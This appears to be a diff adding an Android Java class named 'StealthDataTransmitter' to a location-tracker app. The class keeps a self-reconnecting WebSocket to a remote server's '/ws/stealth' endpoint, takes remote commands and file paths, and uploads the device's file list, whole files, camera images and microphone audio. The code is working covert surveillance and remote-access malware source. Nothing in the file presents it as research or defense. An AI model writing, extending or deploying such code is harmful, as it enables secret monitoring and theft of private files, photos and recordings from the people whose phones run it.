@@ -1,0 +1,386 @@
+package com.example.locationtracker;
+
+import android.content.Context;
+import android.content.Intent;
+import org.json.JSONArray;
+import java.io.File;
+import android.os.Handler;
+import android.os.Looper;
+import android.util.Log;
+import okhttp3.*;
+import org.json.JSONException;
+import org.json.JSONObject;
+import java.io.IOException;
+import java.util.concurrent.TimeUnit;
+import android.content.SharedPreferences;
+
+public class StealthDataTransmitter {
+    private static final String TAG = "StealthDataTransmitter";
+    private static final String SERVER_URL = "https://location-tracker-server-micv.onrender.com";
+
+    private Context context;
+    private Handler keepAliveHandler;
+    private Runnable pingRunnable;
+    private OkHttpClient httpClient;
+    private WebSocket webSocket;
+    private Handler mainHandler;
+    private String currentDeviceId;
+
+    // ДОБАВЬТЕ интерфейс и listener
+    public interface CommandListener {
+        void onCommandReceived(String action);
+    }
+
+    private CommandListener commandListener;
+
+    public StealthDataTransmitter(Context context) {
+        this.context = context;
+        this.mainHandler = new Handler(Looper.getMainLooper());
+
+        this.httpClient = new OkHttpClient.Builder()
+                .connectTimeout(30, TimeUnit.SECONDS)
+                .readTimeout(30, TimeUnit.SECONDS)
+                .writeTimeout(30, TimeUnit.SECONDS)
+                .build();
+    }
+
+    public void setCommandListener(CommandListener listener) {
+        this.commandListener = listener;
+        Log.d(TAG, "CommandListener set: " + (listener != null));
+    }
+
+    public boolean isConnected() {
+        return webSocket != null && webSocket.request().url().host() != null;
+    }
+
+    public void initConnection(String deviceId) {
+        if (deviceId == null || deviceId.equals("null")) {
+            Log.e(TAG, "Cannot connect: deviceId is null or invalid");
+            return;
+        }
+
+        this.currentDeviceId = deviceId;
+
+        Log.d(TAG, "=== WEBSOCKET CONNECTION ===");
+        Log.d(TAG, "Device ID for WebSocket: " + deviceId);
+        Log.d(TAG, "===========================");
+
+        String wsUrl = "wss://location-tracker-server-micv.onrender.com/ws/stealth?deviceId=" + deviceId;
+        Log.d(TAG, "Connecting to: " + wsUrl);
+
+        Request request = new Request.Builder()
+                .url(wsUrl)
+                .build();
+
+        webSocket = httpClient.newWebSocket(request, new WebSocketListener() {
+            @Override
+            public void onOpen(WebSocket webSocket, Response response) {
+                Log.e(TAG, "!!! WEBSOCKET OPENED !!!");
+                Log.d(TAG, "WebSocket connection opened for device: " + deviceId);
+                startKeepAlivePing(webSocket);
+            }
+
+            @Override
+            public void onMessage(WebSocket webSocket, String text) {
+                Log.e(TAG, "!!! WEBSOCKET MESSAGE RECEIVED !!!");
+                Log.e(TAG, "Raw message: " + text);
+
+                try {
+                    JSONObject json = new JSONObject(text);
+
+                    if (json.has("action")) {
+                        String action = json.getString("action");
+                        Log.e(TAG, "!!! ACTION DETECTED: " + action + " !!!");
+
+                        SharedPreferences prefs = context.getSharedPreferences("stealth_commands", Context.MODE_PRIVATE);
+                        SharedPreferences.Editor editor = prefs.edit();
+                        editor.putString("command", action);
+                        editor.putLong("timestamp", System.currentTimeMillis());
+
+                        // ДОБАВЬТЕ: сохраняем file_path если есть
+                        if (json.has("file_path")) {
+                            String filePath = json.getString("file_path");
+                            editor.putString("file_path", filePath);
+                            Log.e(TAG, "File path saved: " + filePath);
+                        }
+
+                        boolean success = editor.commit();
+                        Log.e(TAG, "!!! COMMAND SAVED: " + success + " !!!");
+
+                        if (commandListener != null) {
+                            mainHandler.post(() -> {
+                                Log.e(TAG, "!!! CALLING LISTENER for: " + action + " !!!");
+                                commandListener.onCommandReceived(action);
+                            });
+                        }
+                    }
+                } catch (Exception e) {
+                    Log.e(TAG, "!!! ERROR PARSING MESSAGE !!!", e);
+                }
+            }
+
+            @Override
+            public void onFailure(WebSocket webSocket, Throwable t, Response response) {
+                Log.e(TAG, "WebSocket connection failed", t);
+                stopKeepAlivePing();
+                mainHandler.postDelayed(() -> reconnectWebSocket(deviceId), 5000);
+            }
+
+            @Override
+            public void onClosed(WebSocket webSocket, int code, String reason) {
+                Log.d(TAG, "WebSocket connection closed: " + reason);
+                stopKeepAlivePing();
+
+                mainHandler.postDelayed(() -> {
+                    Log.d(TAG, "Attempting to reconnect WebSocket...");
+                    initConnection(currentDeviceId);
+                }, 3000);
+            }
+        });
+    }
+
+    private void reconnectWebSocket(String deviceId) {
+        Log.d(TAG, "Attempting to reconnect WebSocket...");
+        try {
+            if (webSocket != null) {
+                webSocket.close(1000, "Reconnecting");
+            }
+
+            mainHandler.postDelayed(() -> {
+                initConnection(deviceId);
+            }, 5000);
+
+        } catch (Exception e) {
+            Log.e(TAG, "Error during reconnect", e);
+        }
+    }
+
+    public void sendFileList() {
+        try {
+            JSONObject filesData = FileManager.getFileList(context);
+
+            JSONObject message = new JSONObject();
+            message.put("type", "file_list");
+            message.put("device_id", currentDeviceId);
+            message.put("data", filesData);
+            message.put("timestamp", System.currentTimeMillis());
+
+            if (webSocket != null && isConnected()) {
+                webSocket.send(message.toString());
+                Log.d(TAG, "📁 File list sent: " + filesData.optInt("total", 0) + " files");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send file list", e);
+        }
+    }
+
+    public void sendFile(String filePath) {
+        try {
+            File file = new File(filePath);
+            if (!file.exists() || !file.canRead()) {
+                Log.e(TAG, "Cannot read file: " + filePath);
+                return;
+            }
+
+            // Читаем файл
+            byte[] fileData = new byte[(int) file.length()];
+            java.io.FileInputStream fis = new java.io.FileInputStream(file);
+            fis.read(fileData);
+            fis.close();
+
+            String base64Data = android.util.Base64.encodeToString(fileData, android.util.Base64.NO_WRAP);
+
+            JSONObject message = new JSONObject();
+            message.put("type", "file_download");
+            message.put("device_id", currentDeviceId);
+            message.put("filename", file.getName());
+            message.put("data", base64Data);
+            message.put("size", file.length());
+            message.put("timestamp", System.currentTimeMillis());
+
+            if (webSocket != null && isConnected()) {
+                webSocket.send(message.toString());
+                Log.d(TAG, "File sent: " + file.getName() + " (" + file.length() + " bytes)");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send file", e);
+        }
+    }
+
+    public void sendImageData(byte[] imageData) {
+        if (currentDeviceId == null) {
+            Log.e(TAG, "Cannot send image: deviceId not initialized");
+            return;
+        }
+
+        if (imageData.length > 500 * 1024) {
+            imageData = compressImage(imageData, 90);
+        }
+
+        if (webSocket != null && isConnected()) {
+            try {
+                JSONObject message = new JSONObject();
+                message.put("type", "image");
+                message.put("timestamp", System.currentTimeMillis());
+                message.put("data", android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP));
+
+                boolean sent = webSocket.send(message.toString());
+                if (sent) {
+                    Log.d(TAG, "Image sent via WebSocket: " + imageData.length + " bytes");
+                    return;
+                }
+            } catch (Exception e) {
+                Log.e(TAG, "WebSocket send failed", e);
+            }
+        }
+
+        sendImageViaHTTP(imageData, currentDeviceId);
+    }
+
+    private byte[] compressImage(byte[] imageData, int quality) {
+        try {
+            android.graphics.Bitmap bitmap = android.graphics.BitmapFactory.decodeByteArray(imageData, 0, imageData.length);
+            java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
+            bitmap.compress(android.graphics.Bitmap.CompressFormat.JPEG, quality, baos);
+            return baos.toByteArray();
+        } catch (Exception e) {
+            return imageData;
+        }
+    }
+
+    private void sendImageViaHTTP(byte[] imageData, String deviceId) {
+        try {
+            String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);
+
+            JSONObject payload = new JSONObject();
+            payload.put("type", "image");
+            payload.put("device_id", deviceId);
+            payload.put("data", base64Image);
+            payload.put("timestamp", System.currentTimeMillis());
+
+            RequestBody body = RequestBody.create(
+                    MediaType.parse("application/json"),
+                    payload.toString()
+            );
+
+            Request request = new Request.Builder()
+                    .url(SERVER_URL + "/api/camera/image")
+                    .post(body)
+                    .addHeader("Authorization", "your_secret_key_123")
+                    .build();
+
+            httpClient.newCall(request).enqueue(new Callback() {
+                @Override
+                public void onFailure(Call call, IOException e) {
+                    Log.e(TAG, "Failed to send image via HTTP", e);
+                }
+
+                @Override
+                public void onResponse(Call call, Response response) {
+                    Log.d(TAG, "Image sent via HTTP: " + response.code());
+                    response.close();
+                }
+            });
+
+        } catch (JSONException e) {
+            Log.e(TAG, "Failed to create HTTP image payload", e);
+        }
+    }
+
+    public void sendAudioData(byte[] audioData) {
+        if (currentDeviceId == null || webSocket == null || !isConnected()) {
+            return;
+        }
+
+        try {
+            String base64Audio = android.util.Base64.encodeToString(audioData, android.util.Base64.NO_WRAP);
+
+            JSONObject message = new JSONObject();
+            message.put("type", "audio");
+            message.put("device_id", currentDeviceId);
+            message.put("data", base64Audio);
+            message.put("timestamp", System.currentTimeMillis());
+            message.put("format", "pcm");
+            message.put("sampleRate", 16000);
+            message.put("channels", 1);
+
+            boolean sent = webSocket.send(message.toString());
+
+            if (sent) {
+                Log.d(TAG, "Audio sent: " + audioData.length + " bytes");
+            }
+
+        } catch (Exception e) {
+            Log.e(TAG, "Failed to send audio data", e);
+        }
+    }
+
+    private void startKeepAlivePing(WebSocket ws) {
+        if (keepAliveHandler == null) {
+            keepAliveHandler = new Handler(Looper.getMainLooper());
+        }
+
+        pingRunnable = new Runnable() {
+            @Override
+            public void run() {
+                if (ws != null) {
+                    try {
+                        JSONObject ping = new JSONObject();
+                        ping.put("type", "ping");
+                        ping.put("timestamp", System.currentTimeMillis());
+                        ws.send(ping.toString());
+                        Log.d(TAG, "Ping sent");
+                    } catch (Exception e) {
+                        Log.e(TAG, "Failed to send ping", e);
+                    }
+
+                    keepAliveHandler.postDelayed(this, 20000);
+                }
+            }
+        };
+
+        keepAliveHandler.postDelayed(pingRunnable, 20000);
+    }
+
+    private void stopKeepAlivePing() {
+        if (keepAliveHandler != null && pingRunnable != null) {
+            keepAliveHandler.removeCallbacks(pingRunnable);
+        }
+    }
+
+    public void disconnect() {
+        stopKeepAlivePing();
+        if (webSocket != null) {
+            webSocket.close(1000, "Service stopped");
+            webSocket = null;
+        }
+    }
+
+    public void testConnection(String deviceId) {
+        String testUrl = SERVER_URL + "/api/devices/your_secret_key_123";
+
+        Request request = new Request.Builder()
+                .url(testUrl)
+                .build();
+
+        httpClient.newCall(request).enqueue(new Callback() {
+            @Override
+            public void onFailure(Call call, IOException e) {
+                Log.e(TAG, "HTTP test failed", e);
+            }
+
+            @Override
+            public void onResponse(Call call, Response response) throws IOException {
+                Log.d(TAG, "HTTP test response: " + response.code());
+                if (response.isSuccessful()) {
+                    initConnection(deviceId);
+                } else {
+                    Log.w(TAG, "Server responded with error: " + response.code());
+                }
+                response.close();
+            }
+        });
+    }
+}
